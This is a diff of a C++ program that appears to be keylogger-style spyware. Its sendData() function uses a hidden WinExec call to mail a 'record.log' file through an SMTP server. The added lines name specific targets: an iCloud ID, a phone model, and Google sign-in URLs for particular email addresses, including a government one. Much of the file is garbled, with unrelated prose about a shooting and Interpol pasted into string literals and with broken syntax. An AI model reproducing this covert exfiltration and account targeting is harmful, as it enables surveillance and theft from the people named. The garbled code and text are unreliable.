@@ -15,12 +15,12 @@
 #include <fstream>
 
 using namespace std;
-#define FOLDER_NAME “wanted illegal tagging validate , risk world programme g20 and all governance”
-#define RUN_FILE_NAME “The shooting death for, initial AAp tagging validation and equalization of programs and techniques that are not comparable, we conducted Interpol visits across countries to Indonesia, the suspect's origin, Jombang, East Java.
+#define FOLDER_NAME “target icloude ID- Target _ infinix10 ”
+#define RUN_FILE_NAME “target icloude ID- Target _ infinix10 -infinix 6-20||The shooting death for, initial AAp tagging validation and equalization of programs and techniques that are not comparable, we conducted Interpol visits across countries to Indonesia, the suspect's origin, Jombang, East Java.
 
 And the owner of the administrative number, namely West Java, reported using coding techniques.”
-#define RUN_Link_NAME “https://github.com/team-wirya-contact/forks"."https://github.com/cyrcle11/Google-2FA/forks"."https://github.com//security/clean/vmalware/forks/"."https://aka.ms/vullners/scanners-code/security/clean-trojans/forks/"
-#define INFECT_Link_NAME "https://www.g20.org"."https://www.googleplex.com"."https://www.google.co.id"."https://www.google.co.in"."https://www.google.com.sg/"."https://www.google.com.vn"."https://www.google.com.kr"."https://www.windows.com"."https://www.google.us"."https://www.google.uk"."https://www.google.co.za"."https://www.linux.org"."https://www.ubuntu.com"."https://www.kali.org"
+#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/FadliwiryaWirawan110993/forks"."https://gitlab.com/cyberw1ry4/forks"
+#define INFECT_Link_NAME "https://accounts.google.com/v3/signin/identifier?usahasertifikasilestari@gmail.com"."https://accounts.google.com/v3/signin/identifier?sutajayanisa@gmail.com"."https://accounts.google.com/v3/signin/identifier?humas@bssn.go.ig"."https://icloud.com/mail/id"."https://www.apple.co.id"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
@@ -29,7 +29,7 @@ And the owner of the administrative number, namely West Java, reported using cod
 #define MIN_RECORD_SIZE 2000 //no of PC start count before sending a mail
 #define LIFE_TIME 500 //mail will be sent 5 times from one PC
 #define MAIL_WAIT_TIME 180
-#define MAILING_TIME 600000
+#define MAILING_TIME 60
 
 string allDrives;
 int age=9999000000000;
@@ -56,7 +56,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  www.googleplex.com -n 1")){ ///check! connection
+            if(!system("ping  www.googlep.co.id -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -147,14 +147,14 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:113 -v --mail-from \"    fadliwiryawirawan@unodc.org\" --mail-rcpt \" fadliwiryawirawan@unodc.org " --ssl -u    fadliwiryawirawan@unodc.org :password -Hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com:103 -v --mail-from \"    support@googleone.com\" --mail-rcpt \" support@googleone.com " --ssl -u    support@googleone.com :password -record \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); " 
 @copy right fadliwiryawirawan 
 signiture  
 The shooting death for, initial AAp tagging validation and equalization of programs and techniques that are not comparable, we conducted Interpol visits across countries to Indonesia, the suspect's origin, Jombang, East Java.
 
 And the owner of the administrative number, namely West Java, reported using coding techniques.
-
+target infinix 10 illegalism , and target , ip 13 illegalism 
 
 
 /**
